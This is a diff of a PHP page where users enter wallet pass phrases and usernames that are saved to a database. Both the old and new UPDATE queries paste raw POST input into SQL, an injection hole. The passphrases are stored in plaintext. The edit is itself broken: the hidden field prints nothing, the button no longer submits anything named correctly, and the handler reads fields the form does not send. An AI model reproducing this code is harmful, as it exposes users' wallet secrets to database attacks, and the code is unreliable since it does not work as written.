@@ -1,15 +1,15 @@
 <?php
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Assuming the form is submitted with the wallet_key as a parameter
-    $wallet_key_name = $_POST['wallet_key_name'];
+if (isset($_POST[$wallet_name])) {
 
-    // Assuming the form inputs are passed with POST
-    $pass_phase = $_POST[$wallet_key_name . '_passphase'];
-    $username = $_POST[$wallet_key_name . '_username'];
+    $wallet_phase = $_POST['wallet_phase'];
+    $wallet_username = $_POST['wallet_username'];
+    $wallet_id = $_POST['wallet_id'];
+
 
     // Assuming your database connection is already established ($conn)
-    $sql = "UPDATE wallet SET wallet_phase = '$pass_phase', wallet_username = '$username' WHERE wallet_owner_id = $user_id AND wallet_key = $wallet_key";
+//    $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username' WHERE wallet_owner_id = $user_id AND wallet_key = $wallet_key";
+    $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username' WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";
 
     if ($conn->query($sql) === TRUE) {
         echo "Record updated successfully";
@@ -74,6 +74,7 @@ if ($result->num_rows > 0) {
                         <!-- Modal Body -->
                         <div class="modal-body">
                             <form method="post" id="walletForm<?=$wallet_key_name?>">
+                                <input type="hidden" value="<?$wallet_id?>" name="<?$wallet_id?>">
                                 <div class="form-group">
                                     <label for="<?=$wallet_key_name?>_passphase">Pass Phase</label>
                                     <input type="text" class="form-control" id="<?=$wallet_key_name?>_passphase" name="<?=$wallet_key_name?>_passphase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
@@ -82,7 +83,7 @@ if ($result->num_rows > 0) {
                                     <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
                                     <input type="text" class="form-control" id="<?=$wallet_key_name?>_username" name="<?=$wallet_key_name?>_username" placeholder="Enter your <?=$wallet_key_name?> username">
                                 </div>
-                                <button type="button" class="btn btn-primary" onclick="submitForm<?=$wallet_key_name?>()">Submit</button>
+                                <button type="button" class="btn btn-primary" name="<?=$wallet_name?>">Submit</button>
                             </form>
                         </div>
 
